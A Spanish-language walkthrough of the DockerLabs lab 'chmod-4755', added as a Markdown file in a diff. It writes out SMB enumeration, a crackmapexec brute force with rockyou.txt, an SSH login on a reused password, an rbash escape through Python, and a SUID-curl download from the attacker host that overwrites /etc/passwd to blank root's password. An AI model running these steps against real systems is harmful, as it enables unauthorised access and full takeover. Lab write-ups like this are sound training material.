@@ -1,0 +1,229 @@
+---
+title: chmod-4755
+description: Resolución completa de la máquina virtual *chmod-4755* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **chmod-4755**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone servicios SMB con un usuario identificable mediante enumeración. Tras un ataque de fuerza bruta, se obtienen credenciales SMB que, por reutilización, permiten el acceso SSH al usuario `rabol` con una shell restringida (`rbash`). Se evade la restricción utilizando Python para obtener una shell interactiva completa.
+Una vez dentro, se identifica que el binario `curl` tiene permisos SUID. Aprovechando esta configuración, se sobrescribe el archivo `/etc/passwd` eliminando la contraseña de `root`, lo que permite acceder directamente como superusuario.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'chmod-4755',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '11/09/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip chmod-4755.zip
+sudo bash auto_deploy.sh chmod-4755.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p chmod-4755/{content,exploits,nmap,scripts}
+cd chmod-4755
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **139/tcp** — NetBIOS Session Service
+* **445/tcp** — Microsoft-DS (SMB)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1765847197/Ports_ik9wat.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,139,445 172.17.0.2
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1765847200/Services_pqtsez.png)
+
+---
+
+### 1.3 Enumeración SMB
+
+Se utiliza `enum4linux` para obtener información detallada del servicio SMB:
+
+```bash
+enum4linux -a 172.17.0.2
+```
+
+**Hallazgos clave:**
+1. Usuarios identificados: `smbuser` y `rabol`.
+   ![SMB Users](https://res.cloudinary.com/dewqswzke/image/upload/v1765847198/SmbUsers_whzkr2.png)
+2. Recursos compartidos: `share_secret_only` y `print$`.
+   ![Shares](https://res.cloudinary.com/dewqswzke/image/upload/v1765847197/Shares_fnwcjo.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta a credenciales SMB
+
+Se utiliza `crackmapexec` con el diccionario `rockyou.txt`:
+
+```bash
+crackmapexec smb 172.17.0.2 -u smbuser -p /usr/share/wordlists/rockyou.txt
+```
+
+![Crackmapexec](https://res.cloudinary.com/dewqswzke/image/upload/v1765847196/CrackmapexecResult_gt3nsj.png)
+
+Se obtienen credenciales válidas para `smbuser`.
+
+### 2.2 Exploración de recursos compartidos
+
+Se accede al share `share_secret_only`:
+
+```bash
+smbclient //172.17.0.2/share_secret_only -U smbuser%PASSWORD
+```
+
+![SMB Content](https://res.cloudinary.com/dewqswzke/image/upload/v1765847198/SmbContent_zrjenx.png)
+
+### 2.3 Reutilización de credenciales
+
+El share `print$` sugiere que el usuario `rabol` podría estar utilizando el nombre del share como contraseña. Se prueba:
+
+```bash
+ssh rabol@172.17.0.2
+```
+
+Contraseña: `share_secret_only`
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1765847199/Ssh_gstw7d.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De rabol → rabol (shell completa)
+
+La shell es `rbash` (restringida). Se evade la restricción:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+```
+
+### 3.2 Identificación de binario SUID
+
+Se buscan binarios con permisos SUID:
+
+```bash
+sudo -l
+find / -perm -4000 2>/dev/null
+```
+
+![Find result](https://res.cloudinary.com/dewqswzke/image/upload/v1765847199/FindResult_ytdxso.png)
+
+Se identifica que `curl` tiene permisos SUID.
+
+### 3.3 Sobrescritura de /etc/passwd
+
+Se prepara un archivo `passwd` modificado eliminando la `x` de la línea de `root`:
+
+```bash
+sed -i 's/^root:x:/root::/' passwd
+```
+
+Se sirve el archivo desde la máquina atacante:
+
+```bash
+python3 -m http.server 80
+```
+
+Se sobrescribe `/etc/passwd` en la máquina víctima:
+
+```bash
+curl http://172.17.0.1/passwd -o /etc/passwd
+```
+
+![Curl](https://res.cloudinary.com/dewqswzke/image/upload/v1765847196/Curl_hwjv59.png)
+
+### 3.4 Acceso root
+
+Con la contraseña de `root` eliminada:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765847197/Root_ggj9bk.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Contraseñas débiles y reutilización entre servicios",
+      severity: "Alta",
+      impact: "Acceso inicial al sistema mediante SSH"
+    },
+    {
+      vulnerability: "Configuración de SMB expuesta con usuarios enumerables",
+      severity: "Media",
+      impact: "Enumeración de usuarios y recursos compartidos"
+    },
+    {
+      vulnerability: "Permisos SUID en binario curl",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante sobrescritura de /etc/passwd"
+    },
+    {
+      vulnerability: "Restricciones de rbash mal implementadas",
+      severity: "Media",
+      impact: "Evasión de controles mediante Python"
+    }
+  ]}
+/>
